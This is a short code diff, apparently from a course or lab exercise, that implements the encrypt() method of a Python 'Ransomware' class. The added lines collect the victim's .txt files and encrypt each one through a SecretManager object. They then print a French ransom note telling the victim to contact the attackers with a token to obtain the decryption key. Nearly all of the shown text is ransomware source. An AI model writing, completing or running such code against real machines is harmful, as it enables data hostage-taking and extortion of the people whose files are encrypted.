@@ -46,7 +46,15 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        files = self.get_files("*.txt")
+        secret_manager = SecretManager()
+        secret_manager.setup()
+        for file_path in files :
+            secret_manager.encrypt_file(file_path)
+        print("Vos fichiers ont été chiffrées")
+        print(f"Veuillez nous contacter avec le jeton {secret_manager.get_hex_token ()} pour obtenir la clé de décryptage.")
+        
+        #raise NotImplemented()
 
     def decrypt(self):
         # main function for decrypting (see PDF)
